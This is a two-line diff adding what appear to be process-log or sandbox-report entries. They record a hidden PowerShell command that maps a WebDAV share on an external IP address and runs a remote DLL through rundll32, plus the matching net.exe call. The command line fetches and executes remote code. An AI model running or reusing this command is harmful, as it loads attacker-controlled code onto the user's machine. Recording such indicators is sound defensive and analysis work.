@@ -1,0 +1,2 @@
+110:3692	powershell.exe	powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
+112:2416	net.exe	"C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\
